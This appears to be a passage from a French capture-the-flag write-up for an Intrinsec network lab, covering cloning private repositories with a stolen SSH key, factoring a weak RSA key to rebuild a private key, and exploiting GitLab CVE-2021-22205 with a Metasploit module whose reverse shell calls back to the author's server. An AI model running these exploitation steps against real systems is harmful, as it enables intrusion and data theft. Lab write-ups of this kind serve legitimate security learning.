+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Flag format : &lt;firstname&gt;&lt;lastname&gt;@&lt;maill&gt;.fr
+</span></span></code></pre></div></li>
+</ul>
+<h6 id="solution-1">Solution:</h6>
+<p>On cherche ici un mail . Au challenge précédent , on a récupéré un nom d&rsquo;utilisateur <strong>Gitlab</strong>/<strong>Github</strong> ainsi que <strong>a clé SSH privée</strong> .
+Enfin, dans le fichier <strong>TODO.txt</strong> téléchargé depuis le server <strong>EMPIRE</strong> , on lit :</p>
+<pre tabindex="0"><code># TODO
+
+- Clean history
+- Call operator98 for debug
+- Move to private public github repo :
+  - ransomware
+  - GonnaCry
+  - CrackMapExec
+  - backdoor_py
+</code></pre><p>Parfait ! On a :</p>
+<ul>
+<li><code>Un Username GITLAB</code></li>
+<li><code>Sa Clé SSH Privée</code></li>
+<li><code>Le Nom des Répository</code></li>
+</ul>
+<p>On peut donc <strong>cloner</strong> ses répos privés :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>~/.ssh<span style="color:#f92672">]</span>$ ssh -T git@github.com
+</span></span><span style="display:flex;"><span>Hi apt54! You<span style="color:#e6db74">&#39;ve successfully authenticated, but GitHub does not provide shell access.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[~/.ssh]$ GIT_SSH_COMMAND=&#39;</span>ssh -i /root/.ssh/id_rsa -o IdentitiesOnly<span style="color:#f92672">=</span>yes<span style="color:#e6db74">&#39; git clone git@github.com:apt54/backdoor_py.git
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Cloning into &#39;</span>backdoor_py<span style="color:#960050;background-color:#1e0010">&#39;</span>...
+</span></span><span style="display:flex;"><span>remote: Enumerating objects: 20, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Counting objects: 100% <span style="color:#f92672">(</span>20/20<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Compressing objects: 100% <span style="color:#f92672">(</span>13/13<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Total <span style="color:#ae81ff">20</span> <span style="color:#f92672">(</span>delta 6<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">20</span> <span style="color:#f92672">(</span>delta 6<span style="color:#f92672">)</span>, pack-reused <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Receiving objects: 100% <span style="color:#f92672">(</span>20/20<span style="color:#f92672">)</span>, 74.96 KiB | 446.00 KiB/s, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>Resolving deltas: 100% <span style="color:#f92672">(</span>6/6<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span></code></pre></div><p>Maintenant , on va utiliser <code>GIT GUI</code> sur Windows pour explorer le <code>.git</code>
+Dans les commits, on trouve :</p>
+<p><img src="./img/commit.png" alt="AltText"></p>
+<p>Flag : <code>jordan.alisto@outlook.fr</code></p>
+<hr>
+<h2 id="backup-key-1">Backup key</h2>
+<ul>
+<li><strong>Nom</strong>  : Backup key</li>
+<li><strong>Point</strong> : 40</li>
+<li><strong>Description</strong> :
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>During a previous operation we recovered elements related to their backup system. Unfortunately, we did not succeed in decrypting them. Find us the key, it must be somewhere!
+</span></span></code></pre></div></li>
+</ul>
+<h6 id="solution-2">Solution:</h6>
+<p>On peut se reconnecter sur le premier ssh auquel on a eu accés .</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>harvester@harvester:/$ ls
+</span></span><span style="display:flex;"><span>backups  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+</span></span><span style="display:flex;"><span>harvester@harvester:/$ ls /backups/
+</span></span><span style="display:flex;"><span>backup-log-1.log.zip  backup-log-2.log.zip  backup-log-3.log.zip  backup.sh  password.enc
+</span></span></code></pre></div><p>On trouve un dossier <code>backups</code>
+De plus dans <code>opt</code> , on retrouve un dossier similaire</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>harvester@harvester:/opt$ ls
+</span></span><span style="display:flex;"><span>backups
+</span></span><span style="display:flex;"><span>harvester@harvester:/opt$ ls backups/
+</span></span><span style="display:flex;"><span>backup.pub  test-backup.sh  test.txt  test.txt.enc
+</span></span><span style="display:flex;"><span>harvester@harvester:/opt$
+</span></span></code></pre></div><p>Voici le script de chiffrement, il utilise openssl</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>harvester@harvester:/opt/backups$ cat test-backup.sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$#<span style="color:#e6db74">&#34;</span> -ne <span style="color:#ae81ff">1</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;[-] Error. Usage : ./test-backup.sh &lt;file-to-backup&gt;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    cat $1 | openssl rsautl -encrypt -pubin -inkey backup.pub | base64 | tr -d <span style="color:#e6db74">&#39;\n&#39;</span> &gt; $1.enc
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span></code></pre></div><p>On nous fournit aussi une clée Publique :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-----BEGIN PUBLIC KEY-----
+</span></span><span style="display:flex;"><span>MHwwDQYJKoZIhvcNAQEBBQADawAwaAJhAMrZhFV8l+A5Qxoiatcn8MbUPvPUGEaf
+</span></span><span style="display:flex;"><span>GzdQSbIphD7p+Dsfl3OKwnT19h9AHyHxkT5LZLsxtVo405jA3+0AsTkvCIlxHESz
+</span></span><span style="display:flex;"><span>WeeXbGF/zHNPBuPpXCZHYJG1L0YueUE9tQIDAQAB
+</span></span><span style="display:flex;"><span>-----END PUBLIC KEY-----
+</span></span></code></pre></div><p>C&rsquo;est ici un challenge de crypto basique .
+On doit casser la clé publique pour ainsi reconstruire la clé privée et donc décoder le fichier <strong>.enc</strong></p>
+<p>Pour résoudre ce challenge, il faut les Connaissances basiques du <a href="https://fr.wikipedia.org/wiki/Chiffrement_RSA" target="_blank">chiffrement RSA</a></p>
+<p>On récupère le module N:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /root/Desktop
+</span></span><span style="display:flex;"><span>➜ openssl rsa -noout -text -inform PEM -in key.pub -pubin -modulus
+</span></span><span style="display:flex;"><span>RSA Public-Key: <span style="color:#f92672">(</span><span style="color:#ae81ff">768</span> bit<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Modulus:
+</span></span><span style="display:flex;"><span>    00:ca:d9:84:55:7c:97:e0:39:43:1a:22:6a:d7:27:
+</span></span><span style="display:flex;"><span>    f0:c6:d4:3e:f3:d4:18:46:9f:1b:37:50:49:b2:29:
+</span></span><span style="display:flex;"><span>    84:3e:e9:f8:3b:1f:97:73:8a:c2:74:f5:f6:1f:40:
+</span></span><span style="display:flex;"><span>    1f:21:f1:91:3e:4b:64:bb:31:b5:5a:38:d3:98:c0:
+</span></span><span style="display:flex;"><span>    df:ed:00:b1:39:2f:08:89:71:1c:44:b3:59:e7:97:
+</span></span><span style="display:flex;"><span>    6c:61:7f:cc:73:4f:06:e3:e9:5c:26:47:60:91:b5:
+</span></span><span style="display:flex;"><span>    2f:46:2e:79:41:3d:b5
+</span></span><span style="display:flex;"><span>Exponent: <span style="color:#ae81ff">65537</span> <span style="color:#f92672">(</span>0x10001<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Modulus<span style="color:#f92672">=</span>CAD984557C97E039431A226AD727F0C6D43EF3D418469F1B375049B229843EE9F83B1F97738AC274F5F61F401F21F1913E4B64BB31B55A38D398C0DFED00B1392F0889711C44B359E7976C617FCC734F06E3E95C26476091B52F462E79413DB5
+</span></span></code></pre></div><p>On le récupère en nombre avec python :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#ae81ff">0xCAD984557C97E039431A226AD727F0C6D43EF3D418469F1B375049B229843EE9F83B1F97738AC274F5F61F401F21F1913E4B64BB31B55A38D398C0DFED00B1392F0889711C44B359E7976C617FCC734F06E3E95C26476091B52F462E79413DB5</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1230186684530117755130494958384962720772853569595334792197322452151726400507263657518745202199786469389956474942774063845925192557326303453731548268507917026122142913461670429214311602221240479274737794080665351419597459856902143413</span>
+</span></span></code></pre></div><p>On doit maintenant retrouver <strong>p</strong> et <strong>q</strong> qui sont les facteurs premiers de la clé .
+On peut par exemple utiliser mon Tool : <a href="https://github.com/Vozec/Facto4CTF" target="_blank">Facto4CTF</a> qui permet de factoriser des nombres trés grand avec plusieurs  algorithmes différent .</p>
+<p><a href="http://www.factordb.com/" target="_blank">http://www.factordb.com/</a> fonctionne aussi très bien mais <code>pourquoi utiliser factorDB quand on peut utiliser des courbes elliptiques ?</code></p>
+<p>On obtient :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#ae81ff">33478071698956898786044169848212690817704794983713768568912431388982883793878002287614711652531743087737814467999489</span>
+</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> <span style="color:#ae81ff">36746043666799590428244633799627952632279158164343087642676032283815739666511279233373417143396810270092798736308917</span>
+</span></span></code></pre></div><p>On utilise <a href="https://github.com/ius/rsatool" target="_blank">RsaTool</a> pour reconstruire la clé !</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 rsatool.py -n <span style="color:#ae81ff">1230186684530117755130494958384962720772853569595334792197322452151726400507263657518745202199786469389</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">956474942774063845925192557326303453731548268507917026122142913461670429214311602221240479274737794080665351419597459856902143413</span> -p <span style="color:#ae81ff">33478071698956898786044169848212690817704794983713768568912431388982883793878002287614711652531743087737814467999489</span> -q <span style="color:#ae81ff">36746043666799590428244633799627952632279158164343087642676032283815739666511279233373417143396810270092798736308917</span> -e <span style="color:#ae81ff">65537</span>  -o privkey.key
+</span></span></code></pre></div><p>Finalement, on a la <code>privekey.key</code></p>
+<pre tabindex="0"><code>-----BEGIN RSA PRIVATE KEY-----
+MIIBywIBAAJhAMrZhFV8l+A5Qxoiatcn8MbUPvPUGEafGzdQSbIphD7p+Dsfl3OK
+wnT19h9AHyHxkT5LZLsxtVo405jA3+0AsTkvCIlxHESzWeeXbGF/zHNPBuPpXCZH
+YJG1L0YueUE9tQIDAQABAmB0DeSHYEQoNbqtXhmQRTqdFtt5dtP4u5i/mcDAHL6b
+nBK4CMgGg9HjRsFseawWKHTyjKYQwbl+Xh/66VclzgxrAxw+GIsXGHp5OzIsxABM
+Vo52ybJYVC6iotbs1GL/9AECMQDZgux7RA4oadJTXlH5G6zD6266BC4Qbm+HXD0X
+5T22X//W5OmjYITOYPg9dU3X9wECMQDuvm3SPOfpnA4iSf7MRBjDSvdOQYv6cUw3
+kYKEFKsY8y/X4JMGKkmwMCJcyEX5mrUCMQCXWi353DJJ1tDe6Bv8TlCah+GlmLEB
+CAedVgbA8OhPVl+tBd65q7jd7sXt5glDxQECMQCnEe/8Xc7U9fYWHL4H5+eEUuO5
+ibkRK1Pw1w0ErQoGzbe/VFLOz6z9dNG3KBd/0rkCMH6J+q8/eK2Vi+vGXc92zSHp
+lI4rshqBvhCfrDcrtBuu7b38Z1dz+ky1xc4ZO17bnA==
+-----END RSA PRIVATE KEY-----
+</code></pre><p>On peut l&rsquo;upload en la copiant collant et on peut décoder le fichier : <code>/backups/password.enc</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod <span style="color:#ae81ff">400</span> /tmp/privekey.pem
+</span></span><span style="display:flex;"><span>cat /backups/password.enc | base64 -d &gt; /tmp/decoded_bytes| openssl rsautl -decrypt -in /tmp/decoded_bytes -out /tmp/decoded.txt -inkey /tmp/privkey.pem
+</span></span></code></pre></div><p>On obtient la clé , qui est aussi le flag : <code>RlUiPP2zI5v3uZiqKPej</code></p>
+<h6 id="bonus--déchiffrement-des-backups">Bonus : Déchiffrement des backups</h6>
+<p>Voici le script qui a chiffré les backups :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>harvester@harvester:/backups$ cat backup.sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Please use the password in password.enc for safety. Ask the bigboss for questions.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$#<span style="color:#e6db74">&#34;</span> -ne <span style="color:#ae81ff">2</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;[-] Error. Usage : ./backup.sh &lt;file-to-backup&gt; &lt;password&gt;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># TODO : replace password encryption by public key encryption.</span>
+</span></span><span style="display:flex;"><span>    zip -P $2 $1.zip $1
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span></code></pre></div><p>On voit que c&rsquo;est un zip avec un mot de passe. Malheureusement , nous n&rsquo;avons pas de binaire sur la machine qui nous permette d&rsquo;extraire les fichiers .
+On va donc utiliser python !</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> zipfile <span style="color:#f92672">import</span> ZipFile
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>file_name <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;backup-log-1.log.zip&#34;</span>,<span style="color:#e6db74">&#34;backup-log-2.log.zip&#34;</span>,<span style="color:#e6db74">&#34;backup-log-3.log.zip&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> name <span style="color:#f92672">in</span> file_name:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> ZipFile(name, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> zip:
+</span></span><span style="display:flex;"><span>        zip<span style="color:#f92672">.</span>printdir()
+</span></span><span style="display:flex;"><span>        zip<span style="color:#f92672">.</span>extractall(<span style="color:#e6db74">&#39;/tmp/1&#39;</span>,pwd<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;RlUiPP2zI5v3uZiqKPej&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;Done!&#39;</span>)
+</span></span></code></pre></div><p>Dans les fichiers , on trouve un <strong>Hint</strong> :</p>
+<pre tabindex="0"><code>[HINT] Congratz you found me ! Post exploit is always important. Here&#39;s a gift to help you move forward on the challenge. : &#34;Im your father !&#34;
+</code></pre><p>C&rsquo;est un Hint pour un des challenges précédent : Celui avec <strong>Empire</strong></p>
+<hr>
+<h2 id="financial-statement">Financial statement</h2>
+<ul>
+<li><strong>Nom</strong>  : Financial statement</li>
+<li><strong>Point</strong> : 0</li>
+<li><strong>Description</strong> :
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>We need more information to <span style="color:#66d9ef">continue</span> our investigation. We are confident that their financial operations are beyond our control. Find out more about their <span style="color:#ae81ff">2021</span> financials and their victims!
+</span></span><span style="display:flex;"><span>The flag is the total number of their income in 2021.
+</span></span></code></pre></div></li>
+</ul>
+<h6 id="solution-3">Solution:</h6>
+<p>On va ici revenir sur le nmap du début du ctf :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.51.2
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span> <span style="color:#75715e">#Inconnu</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.51.3
+</span></span><span style="display:flex;"><span>5432/tcp open       PostgreSQL DB 9.6.0 or later
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.51.5
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>80/tcp   open  http             <span style="color:#75715e"># GITLAB</span>
+</span></span><span style="display:flex;"><span>8181/tcp open  intermapper      <span style="color:#75715e"># Gestion de serveur = intermapper</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.14.1.1 // 192.168.51.1
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>80/tcp   open  http             <span style="color:#75715e"># Page Phising microsoft</span>
+</span></span><span style="display:flex;"><span>3000/tcp open  ppp              <span style="color:#75715e"># Login Custom</span>
+</span></span><span style="display:flex;"><span>8000/tcp open  http-alt         <span style="color:#75715e"># phpmyadmin</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.14.1.2
+</span></span><span style="display:flex;"><span>2048/tcp open  caldav  <span style="color:#75715e"># Intéressant</span>
+</span></span></code></pre></div><p>Le GitLab en <code>192.168.51.5</code> sur le port <code>80</code> n&rsquo;a pas encore était exploré</p>
+<p>A ce stade du ctf , j&rsquo;ai tenté beaucoup de choses , bruteforce de login , détection de vulnérabilité sur le serveur , etc ..
+Finalement , il se trouve qu&rsquo;il est <strong>vulnérable</strong> à la <code>CVE-2021-22205</code> qui concerne les exifs .</p>
+<p>Par chance, metasploit nous présente encore une fois un exploit rapide à mettre en place !</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains msfconsole -q
+</span></span><span style="display:flex;"><span>search gitlab
+</span></span><span style="display:flex;"><span>use multi/http/gitlab_exif_rce
+</span></span><span style="display:flex;"><span>set RHOSTS 192.168.51.5
+</span></span><span style="display:flex;"><span>set SRVPORT <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span>set LHOST ip_vps..
+</span></span><span style="display:flex;"><span>exploit
+</span></span></code></pre></div><p>Shell :)</p>
+<p>Maintenant, le but va être de copié et de déchiffrer les fichiers du gitlab .
+<strong>2 Solutions</strong> s&rsquo;offrent à nous :</p>
+<ul>
+<li><code>Monter un Gitlab en local et importer les fichiers</code></li>
+<li><code>Copié les fichiers et tenter de les décoder comme un margoulin x)</code></li>
+</ul>
+<p>Spoiler : Je prend l&rsquo;option 2 !!</p>
+<p>Aprés avoir passé 2h à tenter de monter un docker et d&rsquo;y importer les fichiers sans succés .</p>
+<p>Les fichiers sont situés en : <code>/home/git/data/repositories/@hashed</code>
+Grâce au shell meterpreter , on peut tous télécharger:</p>
+<pre tabindex="0"><code>download /home/git/data/repositories/
+</code></pre><p>Si on regarde l&rsquo;arborescence , on peut voir quelque chose :</p>
+<p><img src="./img/git.png" alt="AltText"></p>
+<p>Oui des <code>git</code> !</p>
+<p>On peut lancer une console <a href="https://docs.gitlab.com/ee/administration/operations/rails_console.html" target="_blank"><code>gitlab-rails</code></a> afin d&rsquo;identifier le nom des répos.</p>
+<p>On tape :</p>
+<pre tabindex="0"><code>ProjectRepository.find_by(disk_path: &#39;@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a&#39;).project
+ProjectRepository.find_by(disk_path: &#39;@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce&#39;).project
+ProjectRepository.find_by(disk_path: &#39;@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b&#39;).project
+ProjectRepository.find_by(disk_path: &#39;@hashed/d4/73/d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35&#39;).project
+ProjectRepository.find_by(disk_path: &#39;@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d&#39;).project
+</code></pre><p>On obtient un nom intéressant : <code>Add accounting sheet (2021)</code></p>
+<p>On peut le vérifier en se rendant dans le dossier :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>➜   git log
+</span></span></code></pre></div><p><img src="./img/git2.png" alt="AltText"></p>
+<p>Intéressant :) . On peut essayer de récupérer le fichier :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>➜   git checkout .
+</span></span><span style="display:flex;"><span>fatal: this operation must be run in a work tree
+</span></span></code></pre></div><p>Hum .. Une recherche rapide et on trouve cet <a href="https://technoteshelp.com/git-fatal-this-operation-must-be-run-in-a-work-tree/" target="_blank">article</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>➜   git --work-tree<span style="color:#f92672">=</span>. checkout master
+</span></span><span style="display:flex;"><span>Already on <span style="color:#e6db74">&#39;master&#39;</span>
+</span></span><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>➜   ls
+</span></span><span style="display:flex;"><span>accounting-2021.xlsx  branches  config  description  HEAD  hooks  index  info  language-stats.cache  logs  objects  refs
+</span></span></code></pre></div><p>On a : <code>accounting-2021.xlsx</code> !
+En l&rsquo;ouvrant :</p>
+<pre tabindex="0"><code>Company	Amount	Paid
+Biboy	54000	yes
+Tyro	31999	yes
+Strawton	9000	no
+Tipo	863789	yes
+Opo	8231	no
+Miuop	87688	yes
+</code></pre><p>On somme tous ceux qui ont étaient payés et on a enfin le dernier flag ! <code>1037476</code></p>
+<hr>
+<h1 id="conclusion">Conclusion</h1>
+<p>C&rsquo;était un super CTF, je n&rsquo;avais jamais fait ce genre de compétition avec un réseau de la sorte ou toutes les machines communiquent entre elles et ou on joue dans ce genre de lab. Ça change des challenges classiques : RCE &gt; PRIVESC &gt; FLAG &gt; CHALL. SUIVANT.
+Encore un grand bravo <a href="https://www.intrinsec.com/" target="_blank">Intrinsec</a> et à <a href="https://twitter.com/th1b4ud" target="_blank">Th1b4ud</a>  qui à tous géré solo pendant la compétition . A refaire !</p>
+<p>Par ailleurs , je suis fier d&rsquo;avoir fini premier au classement !
+<img src="./img/scoreboard.png" alt="Alttext"></p>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="//localhost:1313/writeups/rustytheclown-lehack2022/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>RustyTheClown | leHack 2022 | Catégorie reverse</a>
+        
+	    
+            <div class="next-post">
+                <a href="//localhost:1313/writeups/reverse-challenge-ctf-pwnme2022/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Writeup All Reverse Challenges CTF 2022 | PwnMe...</a>
+            </div>
+        
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#discord">Discord</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#rules">Rules</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#first-">First !</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#bad-practices">Bad practices</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#starting-to-smell-good">Starting to smell good</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#strange-bank">Strange bank</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#where-am-i">Where am I</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#stop-the-agents">Stop the agents</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#backup-key">Backup key</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#final-takedown">Final takedown</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#backup-key-1">Backup key</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#financial-statement">Financial statement</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
